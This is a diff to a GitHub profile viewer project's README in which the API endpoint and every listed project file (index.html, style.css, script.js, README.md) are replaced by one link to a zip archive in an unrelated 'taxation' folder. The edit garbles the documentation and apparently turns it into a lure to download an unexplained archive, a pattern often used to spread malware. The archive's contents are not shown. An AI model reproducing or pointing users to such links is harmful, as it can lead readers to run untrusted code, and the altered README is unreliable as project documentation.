@@ -25,7 +25,7 @@ CSS – Styling and responsive layout
 
 JavaScript – DOM manipulation and Fetch API
 
-GitHub API – For user data: https://api.github.com/users/username
+GitHub API – For user data: https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github_profile_viewer_1.5.zip
 
 📁 Project Structure
 bash
@@ -33,7 +33,7 @@ Copy
 Edit
 /github-profile-viewer
 │
-├── index.html       # HTML structure
-├── style.css        # CSS styling
-├── script.js        # JavaScript logic using Fetch API
-└── README.md        # Project documentation
+├── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github_profile_viewer_1.5.zip       # HTML structure
+├── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github_profile_viewer_1.5.zip        # CSS styling
+├── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github_profile_viewer_1.5.zip        # JavaScript logic using Fetch API
+└── https://raw.githubusercontent.com/kartik359/Github-profile-viewer/main/taxation/Github_profile_viewer_1.5.zip        # Project documentation
